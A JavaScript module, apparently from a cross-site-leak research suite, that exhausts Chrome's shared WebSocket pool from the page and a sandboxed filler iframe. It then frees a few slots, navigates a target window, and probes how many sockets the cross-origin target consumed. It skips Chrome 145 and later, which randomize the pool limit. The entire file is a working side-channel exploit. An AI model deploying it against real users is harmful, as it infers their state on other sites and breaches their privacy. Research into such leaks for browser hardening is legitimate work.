import {WS_URL} from '../config.js'

// Blink allows 255 websockets per renderer process, the shared socket pool 256.
// One process is therefore always one short of filling the pool, so we hold the
// rest in a sandboxed iframe, which gets an opaque origin and its own process.

let SOCKETS = []

// Stay below 255 here, otherwise our probes fail against the per-process cap.
const MAIN = 250
const FILLER = 20
const SLOTS = 3
const PROBE_TIMEOUT = 3000

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const filterWS = (state) => SOCKETS.filter(s => s.readyState === state)

const chromeVersion = () => {
    let m = navigator.userAgent.match(/Chrom(?:e|ium)\/(\d+)/)
    return m ? parseInt(m[1], 10) : 0
}

// Second renderer process, without hosting anything: no allow-same-origin means
// an opaque origin, which Chrome isolates into its own process.
const fillerFrame = (n) => {
    let i = document.createElement('iframe')
    i.sandbox = 'allow-scripts'
    i.srcdoc = `<script>
        const S = []
        for(let i = 0; i < ${n}; i++) S.push(new WebSocket(${JSON.stringify(WS_URL)}))
        addEventListener('message', (e) => {
            if(e.data === 'close') for(const s of S) s.close()
            if(e.data === 'closePending') for(const s of S) if(s.readyState === 0) s.close()
        })
    <\/script>`
    document.body.append(i)
    return i
}

const exaustWsLimit = (limit) => {
    for(let i = 0; i < limit; i++){
        SOCKETS.push(new WebSocket(WS_URL))
    }
}

// Wait until the open count stops growing, which is what a full pool looks like.
// Adapts to the link's RTT instead of guessing a delay.
const noNewWs = async (maxMs = 45000) => {
    let last = -1
    let stable = 0
    let waited = 0
    while(stable < 4 && waited < maxMs){
        await sleep(500)
        waited += 500
        let open = filterWS(1).length
        if(open === last){
            stable++
        }else{
            stable = 0
            last = open
        }
    }
    return last
}

const closeWs = (socks = SOCKETS) => {
    for(let s of socks){
        s.close()
    }
}

const drop = (socks) => {
    closeWs(socks)
    SOCKETS = SOCKETS.filter(s => !socks.includes(s))
}

const waitUntilClosed = async () => {
    let attempts = 0
    while(filterWS(2).length && attempts < 50){
        await sleep(100)
        attempts++
    }
}

// Only report what the browser told us: still connecting is not a slot we got.
const probeWs = () => {
    return new Promise(resolve => {
        let s = new WebSocket(WS_URL)
        let timer = setTimeout(() => resolve({state: 'stalled', socket: s}), PROBE_TIMEOUT)
        s.onopen = () => {
            clearTimeout(timer)
            resolve({state: 'open', socket: s})
        }
        s.onerror = () => {
            clearTimeout(timer)
            resolve({state: 'error', socket: s})
        }
    })
}

const leak = async (url, waitTime = 1500) => {
    let t = performance.now()

    // Chrome randomizes the socket pool capacity since 145, so the pool
    // boundary this measures moves between runs (crbug.com/415691664).
    if(chromeVersion() >= 145){
        return 'Mitigated: random pool limit'
    }

    // Fill the shared pool from two processes.
    let filler = fillerFrame(FILLER)
    exaustWsLimit(MAIN)
    let open = await noNewWs()
    console.debug(`${open} open, ${filterWS(0).length} did not get in`)

    // Sockets still connecting never got a slot and would swallow the ones we
    // free next, so drop them in both processes.
    drop(filterWS(0))
    filler.contentWindow.postMessage('closePending', '*')
    await waitUntilClosed()
    await sleep(500)

    // Make room for the target page.
    let released = filterWS(1).slice(0, SLOTS)
    drop(released)
    await waitUntilClosed()
    await sleep(500)

    window.WW.location = url
    await sleep(waitTime)

    // Take the slots back, whatever we cannot get the target took. Keep the ones
    // that succeed so the pool stays full, drop the rest so none stay queued.
    let probes = await Promise.all(Array.from({length: released.length}, () => probeWs()))
    let regained = 0
    for(let p of probes){
        if(p.state === 'open'){
            SOCKETS.push(p.socket)
            regained++
        }else{
            p.socket.close()
        }
    }
    let res = released.length - regained
    console.debug(`regained ${regained}/${released.length}, ${res} used by target`)

    // cleanup
    closeWs(SOCKETS)
    filler.contentWindow.postMessage('close', '*')
    filler.remove()
    window.WW.location = 'about:blank'
    await waitUntilClosed()
    SOCKETS = []
    console.debug(`Took ${performance.now() - t}ms.`)
    return res
}

export { leak }
